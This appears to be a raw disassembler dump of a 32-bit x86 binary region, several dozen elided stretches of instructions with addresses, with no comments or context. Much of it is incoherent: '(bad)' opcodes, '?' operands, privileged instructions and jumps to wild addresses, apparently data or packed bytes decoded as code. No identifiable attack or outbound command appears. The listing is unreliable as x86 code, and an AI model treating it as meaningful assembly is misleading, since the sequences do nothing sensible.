  40429a:	dec    ecx
  40429b:	pop    es
  40429c:	shl    edi,0xcb
  40429f:	mov    dl,BYTE PTR [ecx-0x16a5c2a3]
  4042a5:	cmp    dl,0x67
  4042a8:	pusha  
  4042a9:	inc    ecx
  4042aa:	lea    edx,es:[eax+ebp*8]
  4042ae:	push   ss
  4042af:	inc    ebp
  4042b0:	xchg   edx,eax
  4042b1:	add    al,0x3e
  4042b3:	mov    esp,?
  4042b5:	sti    
  4042b6:	sbb    esi,eax
  4042b8:	add    BYTE PTR [ebx+0x21],dh
  4042bb:	lea    ebp,[edx-0x1f]
  4042be:	gs dec eax
  4042c0:	dec    eax
  4042c1:	test   al,0x3d
  4042c3:	mov    WORD PTR [ebp-0xf],?
  4042c6:	adc    eax,0xe156fd58
  4042cb:	pusha  
  4042cc:	fmul   DWORD PTR [esi+0x6f]
  4042cf:	xchg   edi,edi
  4042d1:	mov    esp,0x3de274d5
  4042d6:	(bad)  [ebx+eiz*1-0x7f91eef]
  4042dd:	cs dec edi
  4042df:	cmp    edi,0xffffff9c
  4042e2:	mov    ch,0x74
  4042e4:	or     BYTE PTR [ecx+ebx*4],bl
  4042e7:	mov    WORD PTR [ebx],fs
  4042e9:	xor    DWORD PTR [ecx+0x3101ec06],esp
  4042ef:	pop    ebx
  4042f0:	add    cl,ch
  4042f2:	mov    al,ds:0x8911e806
  4042f7:	mov    edi,?
  4042f9:	jmp    0x4042fe
	...
  404322:	add    BYTE PTR [eax],al
  404324:	mov    al,ds:0x8b010806
  404329:	xchg   edx,eax
  40432a:	jmp    esi
  40432c:	hlt    
  40432d:	xchg   edi,eax
  40432e:	pop    ebx
  40432f:	mov    al,0x7f
  404331:	push   edi
  404332:	add    BYTE PTR [eiz*8+0x624c837e],bh
  404339:	mov    WORD PTR [ebx-0xf],?
  40433c:	pusha  
  40433d:	push   es
  40433e:	or     cl,dl
  404340:	add    BYTE PTR [ecx-0x64db1700],0xc9
  404347:	stos   DWORD PTR es:[edi],eax
  404348:	inc    ecx
  404349:	mov    WORD PTR [edx+esi*2+0x11],ss
  40434d:	loopne 0x404394
  40434f:	icebp  
  404350:	fild   DWORD PTR ds:[eax]
  404353:	jmp    0x29aa6e95
  404358:	add    dl,BYTE PTR [edi+0x582700ea]
  40435e:	leave  
  40435f:	ret    0x581b
  404362:	push   ebp
  404363:	mov    eax,ebx
  404365:	sbb    al,0xfc
  404367:	mov    edx,DWORD PTR [edx]
  404369:	nop
  40436a:	mov    cl,BYTE PTR [ebp-0xd]
  40436d:	js     0x40437d
  40436f:	push   ecx
  404370:	es scas eax,DWORD PTR es:[edi]
  404372:	add    ch,BYTE PTR [ebx]
  404374:	pop    ss
  404375:	mov    DWORD PTR [ebx+0x3775459],ebp
  40437b:	rep lods eax,DWORD PTR ds:[esi]
  40437d:	adc    al,0xc9
  40437f:	ret    0x57cf
  404382:	push   ebp
  404383:	mov    eax,DWORD PTR [ebx+0x8b571e]
	...
  4043b1:	add    BYTE PTR [edx-0x2574047d],dl
  4043b7:	(bad)
  4043bb:	js     0x4043bf
  4043bd:	repz sti 
  4043bf:	adc    al,0x5e
  4043c1:	leave  
  4043c2:	push   ebp
  4043c3:	test   bh,bh
  4043c5:	push   esp
  4043c6:	or     al,0xa4
  4043c8:	push   esi
  4043c9:	push   edi
  4043ca:	or     al,0xb
  4043cc:	or     ah,bh
  4043ce:	sbb    al,0x53
  4043d0:	adc    BYTE PTR [ebx],ch
  4043d2:	push   edi
  4043d3:	adc    DWORD PTR [ebp+0xc],edi
  4043d6:	test   BYTE PTR [eax-0xd],bl
  4043d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043da:	ins    BYTE PTR es:[edi],dx
  4043db:	shl    BYTE PTR [ebp+0x1],1
  4043de:	pop    ss
  4043df:	push   ss
  4043e0:	pop    esi
  4043e1:	leave  
  4043e2:	xchg   ebp,eax
  4043e3:	xchg   edx,eax
  4043e4:	call   DWORD PTR [esp+ecx*8-0x4e]
  4043e8:	add    esp,0xffffff93
  4043eb:	sbb    al,0x57
  4043ed:	push   ebx
  4043ee:	call   FWORD PTR [eax+0x1]
  4043f1:	add    BYTE PTR [edi+0x76],dl
  4043f4:	jne    0x4043fe
  4043f6:	iret   
  4043f7:	out    dx,al
  4043f8:	(bad)  
  4043f9:	call   eax
  4043fb:	add    al,0x7d
  4043fd:	or     BYTE PTR [esi],bh
  4043ff:	cmp    DWORD PTR ds:0x42c0c2b,edi
  404405:	add    DWORD PTR [esi],edi
  404407:	je     0x404484
  404409:	adc    al,0x54
  40440b:	or     al,dl
  40440d:	loop   0x404416
  40440f:	(bad)  
  404410:	data16 or BYTE PTR [ecx+0x41],bh
  404414:	jns    0x40448b
	...
  40443e:	add    BYTE PTR [eax],al
  404440:	dec    edx
  404441:	cmp    bh,BYTE PTR [edi]
  404443:	(bad)  
  404444:	ds ins DWORD PTR es:[edi],dx
  404446:	mov    ebx,0xffff052b
  40444b:	cmp    dh,BYTE PTR [esi-0x7cff1b41]
  404451:	and    bh,BYTE PTR [edx+0x4]
  404454:	pcmpeqb mm7,QWORD PTR [esi]
  404457:	(bad)  
  404458:	cmp    DWORD PTR [edx],ecx
  40445a:	dec    edi
  40445b:	(bad)  
  40445c:	mov    ah,0x80
  40445e:	sub    DWORD PTR [eax+0x45797d42],ecx
  404464:	mov    cl,0xc
  404466:	add    BYTE PTR [edx],bh
  404468:	jmp    FWORD PTR [esi+esi*1+0x18762c10]
  40446f:	leave  
  404470:	cwde   
  404471:	xor    eax,0xe8f5d56f
  404476:	inc    ebp
  404477:	leave  
  404478:	jl     0x4043fa
  40447a:	add    edx,DWORD PTR [ebp-0x4b]
  40447d:	mov    BYTE PTR [eax+0x4e4576c4],al
  404483:	push   edi
  404484:	jno    0x4044b5
  404486:	cld    
  404487:	pop    edx
  404488:	mov    ah,0x75
  40448a:	jnp    0x4044d1
  40448c:	arpl   si,di
  40448e:	aas    
  40448f:	add    esi,eax
  404491:	aaa    
  404492:	call   0x3d819a22
  404497:	mov    edx,ebx
  404499:	jg     0x404457
  40449b:	inc    ebp
  40449c:	inc    esi
  40449d:	je     0x4044a2
  40449f:	add    BYTE PTR [esi],bh
  4044a1:	pop    ebx
  4044a2:	jb     0x4044da
	...
  4044cc:	add    BYTE PTR [eax],al
  4044ce:	dec    esi
  4044cf:	jle    0x4044fa
  4044d1:	out    0x83,al
  4044d3:	mov    dh,ah
  4044d5:	lods   eax,DWORD PTR ds:[esi]
  4044d6:	jnp    0x404460
  4044d8:	fisubr WORD PTR [ebp+0x4e714332]
  4044de:	adc    DWORD PTR [ebx+0x14],ebx
  4044e1:	call   0xe86d161f
  4044e6:	mov    ah,0x6e
  4044e8:	mov    cl,0x7b
  4044ea:	xchg   ebx,eax
  4044eb:	mov    esi,esi
  4044ed:	lods   eax,DWORD PTR ds:[esi]
  4044ee:	jnp    0x404478
  4044f0:	jno    0x404501
  4044f2:	es pop edx
  4044f4:	lahf   
  4044f5:	ds loop 0x4044cc
  4044f8:	mov    ah,0xe4
  4044fa:	(bad)  
  4044fb:	outs   dx,BYTE PTR ds:[esi]
  4044fc:	add    DWORD PTR [edx+0x6b],edi
  4044ff:	mov    ch,bl
  404501:	dec    esi
  404502:	enter  0xddd4,0x29
  404506:	mov    ch,0x1f
  404508:	xor    DWORD PTR [ebx],esi
  40450a:	push   edx
  40450b:	dec    ebx
  40450c:	es ds mov dh,0x7c
  404510:	sub    DWORD PTR [ecx+0x3],edi
  404513:	mov    BYTE PTR [ecx+0x0],ah
  404516:	mov    ah,0x1f
  404518:	or     eax,0xa65bfd7b
  40451d:	inc    ebp
  40451e:	cmc    
  40451f:	xchg   ebx,eax
  404520:	sub    esi,edi
  404522:	mov    DWORD PTR [esi],ebp
  404524:	(bad)  
  404525:	xlat   BYTE PTR ds:[ebx]
  404526:	mov    edi,0x79e4fd9e
  40452b:	mov    DWORD PTR [edx],edi
  40452d:	das    
  40452e:	xchg   ebp,eax
  40452f:	xlat   BYTE PTR ds:[ebx]
  404530:	and    al,0xe0
	...
  40455a:	add    BYTE PTR [eax],al
  40455c:	push   cs
  40455d:	mov    bl,BYTE PTR [esp+ecx*1+0x56]
  404561:	movnti DWORD PTR [esi+edi*1],eax
  404565:	loopne 0x404510
  404567:	adc    eax,esi
  404569:	lock jmp 0xca8372
  40456f:	cmp    al,0x32
  404571:	jae    0x4045b8
  404573:	mov    bh,0x1d
  404575:	mov    DWORD PTR [ecx+0x7589162c],ecx
  40457b:	popf   
  40457c:	sbb    al,BYTE PTR [esi-0x17]
  40457f:	jmp    0x160099c1
  404584:	popf   
  404585:	rol    BYTE PTR [ebp+0x79],cl
  404588:	sbb    eax,0x9491f40f
  40458d:	mov    edi,edi
  40458f:	jbe    0x404544
  404591:	push   ds
  404592:	clc    
  404593:	outs   dx,BYTE PTR ds:[esi]
  404594:	xchg   edi,eax
  404595:	(bad)  
  404596:	(bad)  
  404597:	fcom   QWORD PTR ds:0xda597589
  40459d:	xlat   BYTE PTR ds:[ebx]
  40459e:	(bad)  
  40459f:	push   esi
  4045a0:	fisttp QWORD PTR [eax+0x63ea4d75]
  4045a6:	jmp    0x75c88394
  4045ab:	in     eax,dx
  4045ac:	aad    0x5f
  4045ae:	jmp    0xff6b839c
  4045b3:	mov    ah,0x49
  4045b5:	(bad)  
  4045b6:	test   DWORD PTR [edi],edx
  4045b8:	pushf  
  4045b9:	mov    bh,bh
  4045bb:	mov    ecx,0x16febe95
	...
  4045e8:	add    BYTE PTR [eax],al
  4045ea:	popf   
  4045eb:	mov    BYTE PTR [ebp+0x15],dh
  4045ee:	popf   
  4045ef:	push   cs
  4045f0:	clc    
  4045f1:	je     0x4045ba
  4045f3:	jns    0x4045f3
  4045f5:	(bad)  
  4045f6:	pushf  
  4045f7:	sub    ebp,eax
  4045f9:	neg    DWORD PTR [edi+0x16eeff88]
  4045ff:	push   ebx
  404600:	call   0xffc8d859
  404605:	push   ebx
  404606:	cmp    dh,bl
  404608:	cmp    eax,0xff5afb21
  40460d:	push   esp
  40460e:	dec    edx
  40460f:	jae    0x4045cc
  404611:	add    BYTE PTR [ebp+0x7d],bh
  404614:	dec    DWORD PTR [ebx]
  404616:	lahf   
  404617:	jge    0x40468e
  404619:	hlt    
  40461a:	mov    BYTE PTR [ebx],ah
  40461c:	clc    
  40461d:	push   DWORD PTR [edx+0x57]
  404620:	call   0xffbd23d0
  404625:	and    edi,edi
  404627:	jl     0x40469e
  404629:	clc    
  40462a:	mov    edi,0xc8fffdc8
  40462f:	jl     0x4046a6
  404631:	or     BYTE PTR [edi-0x77000846],ch
  404637:	fld    st(3)
  404639:	pop    ebx
  40463a:	ficomp WORD PTR [ebp-0x27adfff8]
  404640:	in     al,dx
  404641:	and    DWORD PTR [ebx],0xffffffb0
  404644:	push   edi
  404645:	mov    esp,DWORD PTR [edx+0x3c00a8f]
  40464b:	push   edx
  40464c:	mov    DWORD PTR [eax],0x0
	...
  404676:	add    BYTE PTR [eax],al
  404678:	out    0x5b,eax
  40467a:	add    BYTE PTR [eax],al
  40467c:	sub    al,0x7c
  40467e:	cmp    DWORD PTR [ebp-0x21],0x5e
  404682:	jne    0x40468b
  404684:	dec    ebp
  404685:	pop    esp
  404686:	add    al,BYTE PTR [eax]
  404688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404689:	js     0x40469a
  40468b:	sbb    edx,0xffffff83
  40468e:	add    DWORD PTR [ebp-0x60],esi
  404691:	in     eax,0x0
  404693:	add    DWORD PTR [edi+0x7c02eb5b],edx
  404699:	int    0x81
  40469b:	retf   0x5b9e
  40469e:	add    al,BYTE PTR [eax]
  4046a0:	sbb    dl,BYTE PTR [ebx]
  4046a2:	cld    
  4046a3:	push   eax
  4046a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a5:	cmc    
  4046a6:	(bad)  
  4046a7:	(bad)  
  4046a8:	repnz push edi
  4046aa:	push   DWORD PTR [ebp+0x6f]
  4046ad:	jae    0x404651
  4046af:	jmp    0xc04ba20b
  4046b4:	ds daa 
  4046b6:	jno    0x404645
  4046b8:	add    ebp,DWORD PTR [edx+0xf3e6a34]
  4046be:	inc    edi
  4046bf:	hlt    
  4046c0:	out    dx,al
  4046c1:	sub    eax,DWORD PTR [edi+edi*8]
  4046c4:	retf   
  4046c5:	mov    eax,ds:0x9d3a75e0
  4046ca:	(bad)
  4046ce:	or     al,0xc0
  4046d0:	mov    bl,0x38
  4046d2:	test   DWORD PTR [ebp+0x26],edi
  4046d5:	jne    0x40472e
  4046d7:	inc    esi
  4046d8:	mov    ebp,0x1d857
	...
  404705:	add    BYTE PTR [ebx+0x67d8476],cl
  40470b:	je     0x404764
  40470d:	cmp    dh,BYTE PTR [ebp-0x71bf23c9]
  404713:	fadd   QWORD PTR [edx-0x3]
  404716:	icebp  
  404717:	std    
  404718:	mov    eax,?
  40471a:	mov    ebx,0x8950dbbf
  40471f:	call   0x1057:0x153e6a03
  404726:	rol    edi,1
  404728:	fucomip st,st(0)
  40472a:	jno    0x404757
  40472c:	add    al,0x0
  40472e:	xor    eax,0x110a5834
  404733:	sbb    al,0x29
  404735:	std    
  404736:	mov    cl,0x3d
  404738:	sub    eax,0x8c7895ff
  40473d:	inc    ebp
  40473e:	dec    edx
  40473f:	jns    0x404704
  404741:	je     0x404786
  404743:	push   ebp
  404744:	push   edi
  404745:	clc    
  404746:	shl    DWORD PTR [eax+eiz*8+0x75],0x8a
  40474b:	ins    BYTE PTR es:[edi],dx
  40474c:	sbb    eax,0x8c743ee9
  404751:	mov    DWORD PTR [ebp+0x34],0x5bbd1c57
  404758:	fs cld 
  40475a:	aas    
  40475b:	or     dh,bh
  40475d:	mov    ebx,?
  40475f:	bound  ebp,QWORD PTR [ecx]
  404761:	xor    al,0x59
  404763:	adc    ch,dh
  404765:	loopne 0x404732
  404767:	push   0xffffffc6
  404769:	push   esi
	...
  404792:	add    BYTE PTR [eax],al
  404794:	cmp    al,BYTE PTR [esi+0x3c560c34]
  40479a:	mov    dh,0xe0
  40479c:	cmp    DWORD PTR [esi],esp
  40479e:	mov    al,ds:0x3c5b4ac5
  4047a3:	lea    ebx,[edx]
  4047a5:	fcomp  QWORD PTR [esp+ecx*1]
  4047a8:	aas    
  4047a9:	pop    ebx
  4047aa:	jmp    0x8e94db32
  4047af:	push   ss
  4047b0:	jmp    0x4047c4
  4047b2:	sub    BYTE PTR [ecx+edi*4],al
  4047b5:	pop    ds
  4047b6:	icebp  
  4047b7:	ins    DWORD PTR es:[edi],dx
  4047b8:	ds xchg ah,bh
  4047bb:	idiv   eax
  4047bd:	psubusw mm4,mm0
  4047c0:	imul   edx,DWORD PTR [edi+0x66],0x56
  4047c4:	ss jae 0x40481c
  4047c7:	loope  0x4047aa
  4047c9:	test   DWORD PTR [eax],esp
  4047cb:	lds    ebp,FWORD PTR [esi]
  4047cd:	pop    ebx
  4047ce:	add    al,ah
  4047d0:	lds    ebp,FWORD PTR [edx+0x5387e518]
  4047d6:	jmp    0x43ec85de
  4047db:	push   esp
  4047dc:	dec    edx
  4047dd:	fdivr  QWORD PTR [ebx]
  4047df:	adc    cl,ah
  4047e1:	mov    bl,0x25
  4047e3:	sub    BYTE PTR [ebx+ebp*2+0x794ef2f8],0x7
  4047eb:	mov    dh,BYTE PTR [edx]
  4047ed:	loopne 0x404798
  4047ef:	mov    bh,bh
  4047f1:	pop    edx
  4047f2:	pop    es
  4047f3:	ret    
  4047f4:	adc    esp,DWORD PTR [ecx+0x362a]
	...
  404822:	mov    ch,0x76
  404824:	add    BYTE PTR [esi-0x9f7e036],bl
  40482a:	lods   al,BYTE PTR ds:[esi]
  40482b:	sar    DWORD PTR [ebp-0xb],1
  40482e:	mov    ah,0x17
  404830:	adc    dl,dh
  404832:	jb     0x404842
  404834:	sbb    BYTE PTR [edx-0x6e],ah
  404837:	fwait
  404838:	jmp    0x42c6:0x255e2fe1
  40483f:	pop    ebx
  404840:	add    BYTE PTR [edx+0x36],dh
  404843:	loopne 0x404885
  404845:	pusha  
  404846:	sbb    DWORD PTR [ebx+0x33],0xffffffab
  40484a:	jns    0x4048c5
  40484c:	call   0xc9653aef
  404851:	stos   DWORD PTR es:[edi],eax
  404852:	dec    esi
  404853:	pop    ebx
  404854:	push   ebp
  404855:	bound  ecx,QWORD PTR [esi]
  404857:	sub    DWORD PTR [ebx+0x755b420c],eax
  40485d:	out    dx,al
  40485e:	add    BYTE PTR [edi],bl
  404860:	or     BYTE PTR [edx],bh
  404862:	jb     0x40487e
  404864:	add    BYTE PTR [edx+0x5f],ch
  404867:	push   edi
  404868:	add    ah,dh
  40486a:	cmp    BYTE PTR [ebp+eax*2+0x4113ccf5],bl
  404871:	jmp    0x41485776
  404876:	sar    DWORD PTR [ebp+0x0],cl
  404879:	jmp    0xbd3fec42
  40487e:	cmp    DWORD PTR [ebx+0x7],esi
  404881:	inc    esi
  404882:	cmp    bl,BYTE PTR [ebx+0x3]
  404885:	adc    DWORD PTR [eax],eax
	...
  4048af:	add    ch,bh
  4048b1:	daa    
  4048b2:	call   0xffc4daa5
  4048b7:	jb     0x4048a3
  4048b9:	test   BYTE PTR [ebp-0xf],dh
  4048bc:	ins    BYTE PTR es:[edi],dx
  4048bd:	jae    0x4048d0
  4048bf:	push   cs
  4048c0:	inc    edx
  4048c1:	pop    ebx
  4048c2:	call   DWORD PTR [ecx+eax*2-0x6eff17d8]
  4048c9:	jge    0x4048cb
  4048cb:	add    BYTE PTR [eax+ebx*4],cl
  4048ce:	pop    ebx
  4048cf:	leave  
  4048d0:	and    eax,0xdc550057
  4048d5:	mov    dl,BYTE PTR [ebx-0x7d]
  4048d8:	loop   0x404930
  4048da:	add    BYTE PTR [ebp+0x58],dh
  4048dd:	popf   
  4048de:	inc    ebp
  4048df:	or     BYTE PTR [eax+edx*1-0x51bffbf],dh
  4048e6:	or     eax,DWORD PTR [eax]
  4048e8:	or     bl,BYTE PTR [edi+eax*8+0x45]
  4048ec:	push   ebx
  4048ed:	jmp    0xa5678a3a
  4048f2:	jne    0x4048fc
  4048f4:	(bad)  
  4048f5:	mov    edx,0xd11700e6
  4048fa:	fdivr  st,st(7)
  4048fc:	dec    edx
  4048fd:	imul   ebp,eax,0xffffffb3
  404900:	leave  
  404901:	push   edi
  404902:	add    BYTE PTR [ebx],al
  404904:	iret   
  404905:	sbb    BYTE PTR [ebx-0x18],dl
  404908:	lods   al,BYTE PTR ds:[esi]
  404909:	mov    al,ds:0xc08cffff
  40490e:	push   DWORD PTR [ebp-0x21]
  404911:	dec    eax
  404912:	call   0x4049d4
	...
  40493b:	add    BYTE PTR [eax],al
  40493d:	add    BYTE PTR [ecx+0xaff0057],bh
  404943:	push   esp
  404944:	push   ebx
  404945:	call   0x40c6e7
  40494a:	data16 sti 
  40494c:	pop    es
  40494d:	mov    bl,0x9f
  40494f:	push   ds
  404950:	add    BYTE PTR [edi+ecx*8-0x5c],dh
  404954:	jne    0x40495e
  404956:	outs   dx,DWORD PTR ds:[esi]
  404957:	mov    ch,0xfb
  404959:	push   DWORD PTR [eax-0x2f]
  40495c:	ret    
  40495d:	pop    ebx
  40495e:	pop    esi
  40495f:	call   0x83ec:0xd0ea0008
  404966:	pop    ebx
  404967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404968:	push   edi
  404969:	push   0x4773e
  40496e:	ds pop edx
  404970:	lods   eax,DWORD PTR ds:[esi]
  404971:	sti    
  404972:	mov    DWORD PTR [esp+ecx*4+0x45],ebx
  404976:	xor    al,0x1f
  404979:	jmp    0x43fc83
  40497e:	jmp    0x4049ef
  404980:	jmp    0x3e6a:0xe0266916
  404987:	sub    BYTE PTR [edi+edi*8],al
  40498a:	sar    DWORD PTR [ecx+0x69],cl
  40498d:	add    BYTE PTR [ecx-0x72],dl
  404990:	jmp    0xc7c0:0x8671ff4b
  404997:	dec    ecx
  404998:	fnsave [ebp+0x3a]
  40499b:	popf   
  40499c:	imul   edi,ebx,0x45c5b231
	...
  4049ca:	add    BYTE PTR [eax],al
  4049cc:	sub    dh,BYTE PTR [ebp+0x3]
  4049cf:	add    BYTE PTR [esi],bh
  4049d1:	and    edi,ebp
  4049d3:	dec    ebx
  4049d4:	jg     0x404a4a
  4049d6:	call   0x88ca0f08
  4049db:	inc    ebp
  4049dc:	ss (bad) 
  4049de:	fdivr  QWORD PTR [edi+0x1]
  4049e1:	add    bl,BYTE PTR [ebx]
  4049e3:	inc    edx
  4049e4:	inc    edx
  4049e5:	jg     0x4049df
  4049e7:	imul   edi,DWORD PTR [esi],0x8e08421f
  4049ed:	lods   al,BYTE PTR ds:[esi]
  4049ee:	sbb    cl,BYTE PTR [ebp+0x7f]
  4049f1:	je     0x4049cf
  4049f3:	xor    ah,dh
  4049f5:	rcr    ch,0xff
  4049f8:	sar    DWORD PTR [ebp-0x3d],1
  4049fb:	je     0x404a40
  4049fd:	or     eax,DWORD PTR [edi-0x4]
  404a00:	aad    0x8c
  404a02:	add    bh,0x42
  404a05:	cmc    
  404a06:	sbb    al,0x0
  404a08:	sub    esp,DWORD PTR [edx-0x77]
  404a0b:	inc    ebp
  404a0c:	stos   BYTE PTR es:[edi],al
  404a0d:	pop    ebx
  404a0e:	(bad)  
  404a0f:	retf   0x577c
  404a12:	jmp    0xbab00f4d
  404a17:	mov    bl,bh
  404a19:	push   edx
  404a1a:	loop   0x4049df
  404a1c:	adc    bl,BYTE PTR [eax+0x69]
  404a1f:	sbb    al,0x3e
  404a21:	or     bl,dh
  404a23:	fwait
  404a24:	ds pop ebx
  404a26:	jmp    0x2bd45f2e
  404a2b:	or     BYTE PTR [esi],bh
  404a2d:	cmc    
  404a2e:	call   0x404a9c
	...
  404a57:	add    BYTE PTR [eax],al
  404a59:	add    BYTE PTR [esi],bh
  404a5b:	cmc    
  404a5c:	jmp    0xe93588ca
  404a61:	imul   edi,DWORD PTR [esi+0x4903e95b],0x8
  404a68:	icebp  
  404a69:	jmp    0x4049f9
  404a6b:	js     0x404a56
  404a6d:	add    eax,ebp
  404a6f:	mov    ds:0x77dc402,al
  404a74:	loop   0x404aa6
  404a76:	push   ss
  404a77:	mov    dl,0x8c
  404a79:	add    edi,DWORD PTR [esi]
  404a7b:	ret    
  404a7c:	call   0x329b8884
  404a81:	retf   
  404a82:	cld    
  404a83:	push   esi
  404a84:	jmp    0x72aeffbf
  404a89:	inc    esi
  404a8a:	ss push esi
  404a8c:	test   eax,0xb1db4357
  404a91:	add    ebp,DWORD PTR [ebx+0x54]
  404a94:	xor    DWORD PTR [ebx],eax
  404a96:	ds pop ebx
  404a98:	jmp    0xe9974767
  404a9d:	fcom   QWORD PTR [ebx+0x53]
  404aa0:	inc    ecx
  404aa1:	cwde   
  404aa2:	fistp  DWORD PTR [edx-0x17]
  404aa5:	add    dh,0x81
  404aa8:	mov    ebp,0xe96a970e
  404aad:	add    edi,DWORD PTR [esi]
  404aaf:	push   edx
  404ab0:	add    BYTE PTR [ebp+edi*2+0x51],bl
  404ab4:	mov    dh,0x29
  404ab6:	xchg   esi,eax
  404ab7:	push   edi
  404ab8:	mov    eax,0x5b3de9
  404abd:	xor    BYTE PTR [eax],al
	...
  404ae7:	add    BYTE PTR [edi+0x56],bh
  404aea:	add    BYTE PTR [esi+eax*8+0x6925836e],bh
  404af1:	hlt    
  404af2:	call   DWORD PTR [edx-0xe8a7dc3]
  404af8:	gs out 0xe5,al
  404afb:	jmp    0x7600a13d
  404b00:	pop    ss
  404b01:	sub    edx,DWORD PTR [eax-0x2f]
  404b04:	loopne 0x404a8a
  404b06:	(bad)  
  404b07:	fmulp  st(3),st
  404b09:	pop    ss
  404b0a:	cld    
  404b0b:	xor    DWORD PTR [edx],ecx
  404b0d:	xor    BYTE PTR [ebp-0x33],0x65
  404b11:	pop    es
  404b12:	or     cl,dl
  404b14:	jecxz  0x404b8d
  404b16:	add    cl,ch
  404b18:	dec    eax
  404b19:	fwait
  404b1a:	jne    0x404b01
  404b1c:	adc    al,0x7
  404b1e:	cld    
  404b1f:	rcr    DWORD PTR [ebp+0x51a6ff85],0x9b
  404b26:	jmp    0x404b12
  404b28:	enter  0xfc16,0xa0
  404b2c:	clc    
  404b2d:	push   edi
  404b2e:	add    BYTE PTR [ecx+edi*4],dh
  404b31:	outs   dx,DWORD PTR ds:[esi]
  404b32:	push   ebx
  404b33:	jb     0x404b7c
  404b35:	dec    edi
  404b36:	push   0xffffffd9
  404b38:	xor    BYTE PTR [ebx+0x7b],dh
  404b3b:	jae    0x404b52
  404b3d:	sub    DWORD PTR [edx-0x17],0xea6a5b5b
  404b44:	push   ebx
  404b45:	pop    ebx
  404b46:	push   0xffffffea
  404b48:	gs pop ebx
  404b4a:	add    cl,ch
	...
  404b74:	add    BYTE PTR [eax],al
  404b76:	mov    ebp,0xd5e17580
  404b7b:	xchg   esp,esp
  404b7d:	add    bh,dl
  404b7f:	pop    esp
  404b80:	mov    DWORD PTR [ebx],eax
  404b82:	out    0x10,eax
  404b84:	pop    esp
  404b85:	push   0xffffffa7
  404b87:	dec    esp
  404b88:	call   0x974dc2
  404b8d:	mov    esp,edx
  404b8f:	pop    eax
  404b90:	push   0x0
  404b92:	lods   eax,DWORD PTR ds:[esi]
  404b93:	pop    esp
  404b94:	push   0x0
  404b96:	mov    ebp,0x38006a56
  404b9b:	push   0x573227e8
  404ba0:	add    BYTE PTR [ebx],cl
  404ba2:	daa    
  404ba3:	sub    ebp,DWORD PTR [edi]
  404ba5:	mov    DWORD PTR [eax+eax*4+0x5cbd0069],esp
  404bac:	push   0x0
  404bae:	or     eax,0x3fe8505b
  404bb3:	jp     0x404bb5
  404bb5:	add    dh,bl
  404bb7:	sbb    BYTE PTR [eax],cl
  404bb9:	or     edx,DWORD PTR [edi+0x4ff242b]
  404bbf:	pop    ebx
  404bc0:	call   0x9c4f80
  404bc5:	push   DWORD PTR [esp+esi*2]
  404bc8:	mov    ah,0xe4
  404bca:	pop    ss
  404bcb:	pop    esp
  404bcc:	mov    DWORD PTR [ebx],0xffffa4d8
  404bd2:	lods   al,BYTE PTR ds:[esi]
  404bd3:	push   edx
  404bd4:	push   DWORD PTR [ebx]
  404bd6:	mov    edi,0xe4ba
	...
  404c03:	add    BYTE PTR [edi],dl
  404c05:	popf   
  404c06:	add    edi,edi
  404c08:	mov    eax,0xa72bffa4
  404c0d:	pop    esi
  404c0e:	inc    ebx
  404c0f:	or     al,bl
  404c11:	or     al,al
  404c13:	pop    ebx
  404c14:	sahf   
  404c15:	xchg   ebp,eax
  404c16:	or     BYTE PTR [eax],al
  404c18:	mov    ds:0x4c53ecd0,al
  404c1d:	inc    ebx
  404c1e:	or     BYTE PTR [ebx+0x74db6d3e],al
  404c24:	xor    DWORD PTR [ecx],edx
  404c26:	push   esi
  404c27:	or     dh,dl
  404c29:	arpl   di,bx
  404c2b:	add    BYTE PTR [esi],bh
  404c2d:	inc    ecx
  404c2e:	push   esi
  404c2f:	add    al,0xa6
  404c31:	mov    edi,0x313e00df
  404c36:	push   ss
  404c37:	call   0x439a4d
  404c3c:	cmc    
  404c3d:	dec    edx
  404c3e:	lds    eax,FWORD PTR [esi+edi*1]
  404c41:	mov    edi,0x35bfec8e
  404c46:	jecxz  0x404c37
  404c48:	sbb    DWORD PTR [eax+0x31],0x3cbebd57
  404c4f:	dec    eax
  404c50:	push   DWORD PTR [ecx+0x3]
  404c53:	je     0x404ca8
  404c55:	jno    0x404c66
  404c57:	pop    ecx
  404c58:	div    BYTE PTR [edx]
  404c5a:	add    al,0xe8
  404c5c:	mov    edi,0x79ffd97a
  404c61:	outs   dx,BYTE PTR ds:[esi]
  404c62:	cmp    cl,BYTE PTR [eax-0x1]
  404c65:	jno    0x404c6a
	...
  404c8f:	add    BYTE PTR [eax],al
  404c91:	add    BYTE PTR [esi],bh
  404c93:	jb     0x404c19
  404c95:	cmp    eax,0x434c9b
  404c9a:	ds inc eax
  404c9c:	out    dx,eax
  404c9d:	(bad)  
  404c9e:	jae    0x404cef
  404ca0:	dec    esp
  404ca1:	inc    ecx
  404ca2:	ds in  al,dx
  404ca4:	gs stc 
  404ca6:	sbb    esi,ebx
  404ca8:	rol    DWORD PTR ds:0x433c73,0x3e
  404caf:	je     0x404cb4
  404cb1:	add    BYTE PTR [ebx-0x6102c11],dh
  404cb7:	std    
  404cb8:	xor    ebp,eax
  404cba:	mov    ds:0xbbffd904,eax
  404cbf:	mul    edi
  404cc1:	out    dx,eax
  404cc2:	loope  0x404d1f
  404cc4:	data16 xor al,0xe6
  404cc7:	mov    esp,0xd0d1d959
  404ccc:	lods   al,BYTE PTR ds:[esi]
  404ccd:	xlat   BYTE PTR ds:[ebx]
  404cce:	outs   dx,BYTE PTR ds:[esi]
  404ccf:	repz (bad) 
  404cd1:	dec    ebx
  404cd2:	jg     0x404d2f
  404cd4:	rol    DWORD PTR ds:0xec695b3e,1
  404cda:	push   ds
  404cdb:	js     0x404cc6
  404cdd:	add    esi,DWORD PTR ds:0x57ede9b
  404ce3:	pop    esp
  404ce4:	jmp    0x1618cdec
  404ce9:	jmp    0x429cb7f
  404cee:	ds pop ebx
  404cf0:	es jg  0x404c79
  404cf3:	outs   dx,BYTE PTR ds:[esi]
  404cf4:	push   es
  404cf5:	fld    DWORD PTR [eax]
	...
  404d1f:	add    BYTE PTR [ecx+0x4e],bh
  404d22:	jmp    0x839b312a
  404d27:	add    edx,esp
  404d29:	pop    edx
  404d2a:	add    DWORD PTR [ebx],0xffffffb3
  404d2d:	fsub   st,st(1)
  404d2f:	call   0x8779cb8d
  404d34:	mov    ebx,0x49d8c67f
  404d39:	sub    ecx,esi
  404d3b:	mov    cs,WORD PTR [edx+0x6e]
  404d3e:	(bad)  
